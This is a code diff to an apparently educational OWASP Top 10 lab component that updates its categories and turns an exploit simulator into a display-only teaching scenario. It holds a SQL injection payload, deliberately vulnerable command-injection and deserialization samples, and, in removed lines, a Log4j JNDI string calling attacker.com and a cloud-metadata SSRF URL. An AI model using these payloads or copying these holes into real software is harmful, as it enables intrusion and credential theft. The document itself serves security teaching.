@@ -27,287 +27,267 @@ export interface OwaspItem {
 const OWASP_TOP_10: OwaspItem[] = [
   {
     id: "A01",
-    code: "A01:2021",
+    code: "A01:2025",
     title: "Broken Access Control",
     description:
-      "Failures allow unauthorized users to view, edit, or delete data belonging to other users (IDOR, privilege escalation).",
+      "Failures allow unauthorized users to view, edit, or delete data belonging to other users (for example, IDOR and privilege escalation).",
     impact:
-      "Data exfiltration, vertical/horizontal privilege escalation, unauthorized API access.",
+      "Data exposure, vertical or horizontal privilege escalation, and unauthorized API actions.",
     payloadExample:
-      "GET /api/v1/account?userId=1002 (Accessing User 1002 session as User 1001)",
-    vulnerableCode: `// VULNERABLE: Trusting user-supplied ID parameter directly
-app.get('/api/invoice/:id', async (req, res) => {
-  const invoice = await db.query('SELECT * FROM invoices WHERE id = ' + req.params.id);
-  res.json(invoice); // No authorization check!
+      "GET /api/v1/account?userId=1002 (User 1001 requests User 1002's record)",
+    vulnerableCode: `// VULNERABLE: Trusting a user-supplied ID without authorization
+app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
+  const invoice = await db.query('SELECT * FROM invoices WHERE id = $1', [req.params.id]);
+  res.json(invoice); // No ownership or role check
 });`,
-    remediatedCode: `// SECURE: Enforce authorization against authenticated session
+    remediatedCode: `// REMEDIATED: Enforce authorization for the authenticated principal
 app.get('/api/invoice/:id', authMiddleware, async (req, res) => {
   const invoice = await db.query(
     'SELECT * FROM invoices WHERE id = $1 AND owner_id = $2',
     [req.params.id, req.user.id]
   );
-  if (!invoice) return res.status(403).json({ error: 'Forbidden' });
+  if (!invoice) return res.status(404).json({ error: 'Not found' });
   res.json(invoice);
 });`,
     keyDefenses: [
-      "Enforce RBAC/ABAC at domain model layer",
-      "Deny access by default (Principle of Least Privilege)",
-      "Log access control failures and alert on repeated violations",
+      "Enforce authorization at the domain/resource layer, not only in the UI",
+      "Deny by default and test both horizontal and vertical access boundaries",
+      "Log access-control failures without recording sensitive payloads",
     ],
   },
   {
     id: "A02",
-    code: "A02:2021",
-    title: "Cryptographic Failures",
+    code: "A02:2025",
+    title: "Security Misconfiguration",
     description:
-      "Exposure of sensitive data in transit or at rest due to weak algorithms (MD5/SHA1), missing TLS, or hardcoded keys.",
+      "Insecure defaults, unnecessary features, excessive permissions, verbose errors, or inconsistent environments can expose an application or its data.",
     impact:
-      "Credential theft, PII leakage, session hijacking over insecure networks.",
+      "Unnecessary attack surface, information disclosure, unauthorized cloud access, or weakened isolation.",
     payloadExample:
-      "Intercepting plain HTTP traffic or decrypting DB passwords hashed with legacy MD5 without salt.",
-    vulnerableCode: `// VULNERABLE: Plain MD5 hash without salt & hardcoded secret key
-const crypto = require('crypto');
-const secretKey = "SuperSecretKey123";
-function hashPassword(password) {
-  return crypto.createHash('md5').update(password).digest('hex');
-}`,
-    remediatedCode: `// SECURE: Argon2id or bcrypt with random salt & KMS managed secret
-const bcrypt = require('bcrypt');
-async function hashPassword(password) {
-  const saltRounds = 12;
-  return await bcrypt.hash(password, saltRounds);
-}`,
+      "GET /debug/pprof or a request to a storage resource whose policy permits Principal \"*\"",
+    vulnerableCode: `// VULNERABLE: Detailed production errors disclose internals
+app.use((err, req, res, next) => {
+  res.status(500).json({ error: err.message, stack: err.stack, env: process.env });
+});`,
+    remediatedCode: `// REMEDIATED: Generic client response, restricted internal telemetry
+app.use((err, req, res, next) => {
+  logger.error({ err, path: req.path, requestId: req.id });
+  res.status(500).json({ error: 'Internal Server Error', requestId: req.id });
+});`,
     keyDefenses: [
-      "Use TLS 1.3 everywhere with strong ciphers",
-      "Hash passwords with bcrypt/Argon2id with work factor >= 12",
-      "Never hardcode secrets in source code; use KMS / Vault",
+      "Use hardened, repeatable configuration through reviewed IaC",
+      "Remove unused endpoints, features, credentials, and network exposure",
+      "Continuously test cloud policies, headers, error handling, and defaults",
     ],
   },
   {
     id: "A03",
-    code: "A03:2021",
-    title: "Injection (SQL, Command, XSS)",
+    code: "A03:2025",
+    title: "Software Supply Chain Failures",
     description:
-      "Untrusted user data sent to an interpreter as part of a command or query, resulting in unauthorized command execution.",
+      "Weaknesses in dependency selection, build inputs, update processes, or artifact provenance can let compromised software reach users.",
     impact:
-      "Remote Code Execution (RCE), complete database takeover, session hijacking.",
-    payloadExample: `' UNION SELECT 1, username, password_hash FROM users --`,
-    vulnerableCode: `// VULNERABLE: Direct string concatenation in SQL & shell commands
-const user = req.query.username;
-db.query("SELECT * FROM users WHERE name = '" + user + "'");
-exec("ping -c 1 " + req.query.host); // Command injection!`,
-    remediatedCode: `// SECURE: Parameterized queries & strict input validation
-db.query("SELECT * FROM users WHERE name = $1", [user]);
-
-// Command execution replacement with execFile & array args
-const { execFile } = require('child_process');
-execFile('ping', ['-c', '1', validatedHost], (err, stdout) => { ... });`,
+      "Malicious or vulnerable code in released software, build compromise, and difficult-to-trace downstream impact.",
+    payloadExample:
+      "A dependency update changes the resolved artifact without an approved review or provenance check.",
+    vulnerableCode: `// VULNERABLE: Mutable dependency range without a reviewed lockfile
+"dependencies": {
+  "example-package": "^1.4.0"
+}`,
+    remediatedCode: `// REMEDIATED: Review the lockfile and verify artifact provenance in CI
+// package-lock.json records the exact resolved version and integrity.
+// CI also checks advisories, provenance attestations, and approved sources.`,
     keyDefenses: [
-      "Use ORM / Prepared Parameterized SQL queries",
-      "Context-aware output encoding (HTML, JS, URL)",
-      "Strict allowlist validation for all user input parameters",
+      "Generate and retain an SBOM for released artifacts",
+      "Review updates, use lockfiles, and verify signatures or provenance where supported",
+      "Patch known vulnerabilities while preserving a tested rollback path",
     ],
   },
   {
     id: "A04",
-    code: "A04:2021",
-    title: "Insecure Design",
+    code: "A04:2025",
+    title: "Cryptographic Failures",
     description:
-      "Flaws in architecture, threat modeling, and security design patterns that cannot be fixed by implementation alone.",
+      "Sensitive data can be exposed when protection is absent, misapplied, or based on obsolete algorithms, keys, protocols, or password-storage choices.",
     impact:
-      "Unlimited bot password guessing, missing rate limits, logical workflow bypass.",
+      "Credential theft, personal-data exposure, session compromise, or loss of confidentiality and integrity.",
     payloadExample:
-      "Submitting 50,000 promo code requests concurrently due to missing transactional locking.",
-    vulnerableCode: `// VULNERABLE: Unlimited password reset attempts without rate limiting or captcha
-app.post('/api/reset-password', async (req, res) => {
-  await sendResetEmail(req.body.email);
-  res.send({ status: 'sent' });
-});`,
-    remediatedCode: `// SECURE: Rate-limiting, anti-automation token & IP throttling
-const rateLimit = require('express-rate-limit');
-const resetLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 3 });
-
-app.post('/api/reset-password', resetLimiter, verifyCaptcha, async (req, res) => {
-  await sendResetEmail(req.body.email);
-  res.send({ status: 'sent' });
-});`,
+      "Intercepting plain HTTP traffic or recovering passwords stored with unsalted MD5.",
+    vulnerableCode: `// VULNERABLE: Fast password hash and hardcoded key
+const secretKey = "example-only-key";
+function hashPassword(password) {
+  return crypto.createHash('md5').update(password).digest('hex');
+}`,
+    remediatedCode: `// REMEDIATED: Use a password-hashing library with tuned work factors
+const argon2 = require('argon2');
+async function hashPassword(password) {
+  return argon2.hash(password, { type: argon2.argon2id });
+}
+// Keep application keys in a managed secret or key-management service.`,
     keyDefenses: [
-      "Integrate threat modeling (STRIDE) into architecture phase",
-      "Implement circuit breakers, rate limits, and quota controls",
-      "Segregate tenant resources and limit blast radius",
+      "Use TLS for network paths and select protocols/ciphers for the actual compatibility boundary",
+      "Hash passwords with a memory-hard password-hashing function and tune its cost",
+      "Manage keys and secrets outside source code, with rotation and access auditing",
     ],
   },
   {
     id: "A05",
-    code: "A05:2021",
-    title: "Security Misconfiguration",
+    code: "A05:2025",
+    title: "Injection",
     description:
-      "Default credentials left unchanged, overly verbose error stack traces, unpatched cloud S3 buckets, unnecessary open ports.",
+      "Untrusted data reaches an interpreter as code or a query, allowing an attacker to change the intended operation (SQL, command, template, or XSS contexts).",
     impact:
-      "Full server compromise, internal infrastructure mapping, cloud bucket data leaks.",
-    payloadExample:
-      "Reading AWS metadata at http://169.254.169.254 or inspecting /debug/pprof open endpoints.",
-    vulnerableCode: `// VULNERABLE: Verbose error handling returning full stack traces in Production
-app.use((err, req, res, next) => {
-  res.status(500).json({ error: err.message, stack: err.stack, env: process.env });
-});`,
-    remediatedCode: `// SECURE: Generic error message in Prod, structured logging internally
-app.use((err, req, res, next) => {
-  logger.error({ err, path: req.path, user: req.user?.id });
-  res.status(500).json({ error: 'Internal Server Error', requestId: req.id });
-});`,
+      "Unauthorized data access or modification, script execution, and in some contexts code execution.",
+    payloadExample: `' UNION SELECT 1, username, password_hash FROM users --`,
+    vulnerableCode: `// VULNERABLE: Direct string concatenation in SQL and shell commands
+const user = req.query.username;
+db.query("SELECT * FROM users WHERE name = '" + user + "'");
+exec("ping -c 1 " + req.query.host);`,
+    remediatedCode: `// REMEDIATED: Parameterize queries and avoid shells for fixed operations
+db.query("SELECT * FROM users WHERE name = $1", [user]);
+
+const { execFile } = require('child_process');
+execFile('ping', ['-c', '1', validatedHost], callback);`,
     keyDefenses: [
-      "Automated hardening via IaC (Terraform / Ansible)",
-      "Disable unnecessary features, frameworks, and API endpoints",
-      "Audit cloud IAM policies and S3 bucket public permissions",
+      "Use parameterized queries and APIs that keep data separate from instructions",
+      "Encode output for its actual context; validation is not a replacement for encoding",
+      "Prefer fixed-argument process APIs and tightly constrain any unavoidable interpreter input",
     ],
   },
   {
     id: "A06",
-    code: "A06:2021",
-    title: "Vulnerable & Outdated Components",
+    code: "A06:2025",
+    title: "Insecure Design",
     description:
-      "Using third-party libraries, packages, or container images with known published CVE vulnerabilities.",
+      "Missing security requirements, abuse-case analysis, or resilient workflow design creates risks that implementation patches alone cannot reliably remove.",
     impact:
-      "Exploitation of zero-day or known public exploits (Log4j, Spring4Shell).",
-    payloadExample: `\${jndi:ldap://attacker.com/exploit} (Log4j RCE)`,
-    vulnerableCode: `// VULNERABLE: Unpinned dependencies in package.json
-"dependencies": {
-  "express": "*",
-  "log4j-node": "1.0.0" // Vulnerable component!
-}`,
-    remediatedCode: `// SECURE: Lockfiles, automated vulnerability scanners in CI/CD pipeline
-// .github/workflows/security.yml
-// - name: Run Trivy vulnerability scanner
-//   uses: aquasecurity/trivy-action@master
-//   with:
-//     exit-code: 1
-//     severity: 'CRITICAL,HIGH'`,
+      "Workflow bypasses, unlimited automation, tenant escape, fraud, or unsafe recovery paths.",
+    payloadExample:
+      "Submitting thousands of password-reset requests because the workflow has no abuse budget or rate control.",
+    vulnerableCode: `// VULNERABLE: Sensitive workflow has no abuse controls
+app.post('/api/reset-password', async (req, res) => {
+  await sendResetEmail(req.body.email);
+  res.send({ status: 'sent' });
+});`,
+    remediatedCode: `// REMEDIATED: Add abuse controls and avoid account enumeration
+app.post('/api/reset-password', resetLimiter, verifyChallenge, async (req, res) => {
+  await queueResetEmail(req.body.email);
+  res.send({ status: 'If the account exists, instructions were sent' });
+});`,
     keyDefenses: [
-      "Continuous CI dependency scans via Snyk / Trivy / Dependabot",
-      "Software Bill of Materials (SBOM) generation & tracking",
-      "Subscribe to CVE advisories and automated patch release feeds",
+      "Threat-model trust boundaries, abuse cases, and recovery workflows before implementation",
+      "Define rate, quota, transaction, and blast-radius controls as requirements",
+      "Make tenant isolation, authorization, and failure behavior testable design properties",
     ],
   },
   {
     id: "A07",
-    code: "A07:2021",
-    title: "Identification & Auth Failures",
+    code: "A07:2025",
+    title: "Authentication Failures",
     description:
-      "Weak password policies, missing Multi-Factor Authentication (MFA), session fixation, or improper token validation.",
-    impact: "Account takeover, credential stuffing attacks, session hijacking.",
-    payloadExample:
-      "Automated credential stuffing with 100k leaked username/password combos.",
-    vulnerableCode: `// VULNERABLE: Storing JWT in unsecure localStorage without HTTPOnly flag
-res.json({ token: jwtToken }); // Frontend puts in localStorage -> Vulnerable to XSS!`,
-    remediatedCode: `// SECURE: Set JWT in HTTPOnly, Secure, SameSite=Strict Cookie
+      "Weak authentication, session handling, credential recovery, or token validation can let an attacker impersonate a user.",
+    impact: "Account takeover, credential stuffing, session theft, and unauthorized privileged actions.",
+    payloadExample: "Automated credential stuffing with reused username/password pairs.",
+    vulnerableCode: `// VULNERABLE: Returning a bearer token for browser code to store
+res.json({ token: jwtToken }); // A later XSS can read localStorage`,
+    remediatedCode: `// REMEDIATED: Cookie attributes reduce token exposure; add CSRF defenses
 res.cookie('token', jwtToken, {
   httpOnly: true,
   secure: true,
-  sameSite: 'strict',
-  maxAge: 3600000 // 1 hour
-});`,
+  sameSite: 'lax',
+  maxAge: 3600000
+});
+// Validate issuer, audience, expiry, and signature on every token use.`,
     keyDefenses: [
-      "Enforce MFA for all user & administrator logins",
-      "Use HTTPOnly, Secure cookies for web session tokens",
-      "Implement breach credential lookup (HaveIBeenPwned API)",
+      "Use phishing-resistant MFA where practical and protect recovery paths",
+      "Validate token signature, issuer, audience, expiry, and intended use",
+      "Use secure cookie or token patterns together with CSRF and XSS defenses",
     ],
   },
   {
     id: "A08",
-    code: "A08:2021",
-    title: "Software & Data Integrity Failures",
+    code: "A08:2025",
+    title: "Software or Data Integrity Failures",
     description:
-      "Code and infrastructure that does not protect against integrity violations (unverified auto-updates, insecure deserialization).",
+      "Code, updates, serialized data, or build artifacts are accepted without enough integrity verification or safe parsing.",
     impact:
-      "Supply chain attacks (SolarWinds style), arbitrary code execution via object deserialization.",
+      "Supply-chain compromise, tampered releases, unsafe deserialization, or unauthorized application behavior.",
     payloadExample:
-      "Tampered npm package update without cryptographic checksum verification.",
-    vulnerableCode: `// VULNERABLE: Insecure deserialization of user input
+      "A release artifact is replaced after build but before deployment.",
+    vulnerableCode: `// VULNERABLE: Unsafe deserialization of attacker-controlled data
 const serialize = require('node-serialize');
 app.post('/api/profile', (req, res) => {
-  const userObj = serialize.unserialize(req.body.data); // Executed arbitrary functions!
+  const userObj = serialize.unserialize(req.body.data);
+  res.json(userObj);
 });`,
-    remediatedCode: `// SECURE: Standard JSON parsing with strict schema validation (Zod)
-import { z } from 'zod';
+    remediatedCode: `// REMEDIATED: Parse a constrained data format and validate its schema
 const UserSchema = z.object({ username: z.string(), email: z.string().email() });
-
 app.post('/api/profile', (req, res) => {
-  const validated = UserSchema.parse(JSON.parse(req.body.data));
+  const validated = UserSchema.parse(req.body);
   res.json(validated);
 });`,
     keyDefenses: [
-      "Verify digital signatures and SHA256 checksums on build artifacts",
-      "Use signed Git commits (GPG) and container image signing (Cosign)",
-      "Avoid native object deserialization on untrusted payloads",
+      "Verify artifact signatures, hashes, attestations, and trusted build provenance",
+      "Use safe, schema-validated data formats instead of executable object deserialization",
+      "Protect release metadata and deployment permissions from unauthorized changes",
     ],
   },
   {
     id: "A09",
-    code: "A09:2021",
-    title: "Security Logging & Monitoring Failures",
+    code: "A09:2025",
+    title: "Security Logging and Alerting Failures",
     description:
-      "Insufficient logging, audit trails, or real-time monitoring allows attackers to maintain persistence undetected.",
+      "Missing, incomplete, inaccessible, or unactionable security telemetry prevents detection, investigation, and response.",
     impact:
-      "Undetected data breaches lasting months, inability to perform post-incident forensics.",
+      "Longer attacker dwell time, weak forensic evidence, missed abuse, and delayed containment.",
     payloadExample:
-      "Brute forcing admin panel over 3 weeks without a single security alert firing.",
-    vulnerableCode: `// VULNERABLE: Swallowing authentication errors quietly
+      "Repeated privileged-login failures generate no durable, queryable event or alert.",
+    vulnerableCode: `// VULNERABLE: Authentication failures disappear
 try {
   await authenticate(user, pass);
-} catch (e) {
-  // Silent fail - no log generated!
+} catch {
+  return res.status(401).end(); // No security event or correlation ID
 }`,
-    remediatedCode: `// SECURE: Structured JSON security audit logging to SIEM (Datadog / Splunk)
+    remediatedCode: `// REMEDIATED: Emit structured, privacy-aware security telemetry
 try {
   await authenticate(user, pass);
-} catch (e) {
-  logger.warn({
-    event: 'AUTH_FAILURE',
-    username: user,
-    ip: req.ip,
-    userAgent: req.headers['user-agent'],
-    timestamp: new Date().toISOString(),
-  });
-  throw e;
+} catch (error) {
+  logger.warn({ event: 'AUTH_FAILURE', userId, requestId, sourceIp });
+  throw error;
 }`,
     keyDefenses: [
-      "Log all authentication, authorization, and input validation failures",
-      "Ensure log retention & tamper-proof centralized SIEM storage",
-      "Establish automated threshold alerts for anomalous activity",
+      "Log authentication, authorization, and high-value changes with useful context",
+      "Centralize protected logs with retention, access control, and time synchronization",
+      "Tune detections for signal, response ownership, and false-positive review",
     ],
   },
   {
     id: "A10",
-    code: "A10:2021",
-    title: "Server-Side Request Forgery (SSRF)",
+    code: "A10:2025",
+    title: "Mishandling of Exceptional Conditions",
     description:
-      "Server fetches a remote resource without validating the user-supplied URL, allowing requests to internal network services.",
+      "Unexpected input, resource exhaustion, partial failures, and error paths must fail safely rather than bypassing controls or leaking details.",
     impact:
-      "Access to internal cloud metadata (AWS IMDSv1), internal network port scanning, remote file retrieval.",
+      "Fail-open authorization, inconsistent state, denial of service, information disclosure, or unsafe recovery.",
     payloadExample:
-      "POST /fetch-avatar?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-    vulnerableCode: `// VULNERABLE: Direct HTTP request to user-controlled URL
-app.post('/api/preview', async (req, res) => {
-  const response = await fetch(req.body.url); // Fetches internal metadata / localhost!
-  const data = await response.text();
-  res.send(data);
-});`,
-    remediatedCode: `// SECURE: Restrict allowed protocols, enforce domain allowlist, & block private IP ranges
-import ipaddr from 'ipaddr.js';
-
-function validateUrl(userUrl) {
-  const parsed = new URL(userUrl);
-  if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Invalid protocol');
-  
-  const ip = ipaddr.parse(parsed.hostname);
-  if (ip.range() !== 'unicast') throw new Error('Private IP range blocked');
-  return true;
-} // Or enforce AWS IMDSv2 requiring token headers!`,
+      "A malformed request triggers a fallback path that returns success before authorization completes.",
+    vulnerableCode: `// VULNERABLE: Error path reports success and skips the policy decision
+try {
+  await authorizeAndProcess(req);
+} catch {
+  res.status(200).json({ ok: true });
+}`,
+    remediatedCode: `// REMEDIATED: Fail closed and return a generic, traceable error
+try {
+  await authorizeAndProcess(req);
+} catch (error) {
+  logger.error({ error, requestId: req.id });
+  res.status(500).json({ error: 'Request could not be completed', requestId: req.id });
+}`,
     keyDefenses: [
-      "Enforce URL allowlists and sanitize hostname resolution",
-      "Block requests to 127.0.0.1, 10.0.0.0/8, 169.254.169.254",
-      "Enforce AWS IMDSv2 (requires session token header)",
+      "Make authorization, validation, and transaction boundaries fail closed",
+      "Bound resource use and handle timeouts, retries, partial failure, and cancellation",
+      "Return safe client errors while retaining enough internal context to investigate",
     ],
   },
 ];
@@ -330,15 +310,10 @@ export default function SecOwaspSection() {
     OWASP_TOP_10.find((item) => item.id === selectedOwaspId) || OWASP_TOP_10[0];
 
   const handleTestExploit = () => {
-    if (testMode === "vulnerable") {
-      setTestOutput(
-        `🚨 EXPLOIT SUCCESSFUL (200 OK)\n[VULNERABLE HANDLER EXECUTED PAYLOAD]\nPayload: "${testPayload}"\nOutput: Returned confidential record [User ID 1002, Email: admin@corp.internal, Role: SUPERADMIN].\nReason: No authorization check performed on session token.`
-      );
-    } else {
-      setTestOutput(
-        `🛡️ EXPLOIT BLOCKED (403 FORBIDDEN)\n[SECURE HANDLER SANITIZED & EVALUATED]\nPayload: "${testPayload}"\nOutput: { "error": "Access Denied", "code": "ERR_UNAUTHORIZED_RESOURCE_OWNER" }\nReason: Session token owner (User 1001) does not match requested resource owner (User 1002). Incident logged to SIEM.`
-      );
-    }
+    const isVulnerable = testMode === "vulnerable";
+    setTestOutput(
+      `${isVulnerable ? "TEACHING SCENARIO: CONTROL FAILURE" : "TEACHING SCENARIO: CONTROL APPLIED"}\nCategory: ${activeOwasp.code} ${activeOwasp.title}\nPayload: "${testPayload}"\nResult: ${isVulnerable ? "The fixture represents the vulnerable path; no request is sent and no code is executed." : "The fixture represents a defensive response; no request is sent and no code is executed."}\nReason: ${isVulnerable ? activeOwasp.keyDefenses[0] + " is absent in this teaching path." : activeOwasp.keyDefenses[0] + " is applied in this teaching path."}`
+    );
   };
 
   return (
@@ -353,9 +328,8 @@ export default function SecOwaspSection() {
             OWASP Top 10 Vulnerability Matrix &amp; Remediation Lab
           </h3>
           <p className="text-xs text-slate-500 dark:text-slate-400 mt-0.5">
-            Select any OWASP Top 10 category to view real-world exploit
-            scenarios, compare vulnerable vs remediated code, and run
-            interactive exploit tests.
+            Select any OWASP Top 10:2025 category to inspect a display-only teaching scenario,
+            compare vulnerable and remediated code, and identify the relevant defenses.
           </p>
         </div>
       </div>
@@ -462,10 +436,10 @@ export default function SecOwaspSection() {
           </ul>
         </div>
 
-        {/* Exploit Simulator */}
+        {/* Display-only scenario tester */}
         <div className="p-5 rounded-xl bg-white dark:bg-slate-800 border border-slate-200 dark:border-slate-700 space-y-4">
           <h5 className="text-xs font-bold text-slate-900 dark:text-slate-100 flex items-center gap-2">
-            <span>🧪</span> Exploit / Defense Interactive Tester
+            <span>🧪</span> Display-only scenario tester
           </h5>
 
           <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
@@ -498,12 +472,11 @@ export default function SecOwaspSection() {
             </div>
           </div>
 
-          {/* Fix Issue 3: text-white instead of text-slate-900 */}
           <button
             onClick={handleTestExploit}
             className="px-4 py-2 rounded-lg bg-indigo-600 text-white font-semibold text-xs hover:bg-indigo-700 dark:hover:bg-indigo-600 transition-all"
           >
-            Execute Test Request
+            Run teaching scenario
           </button>
 
           {testOutput && (
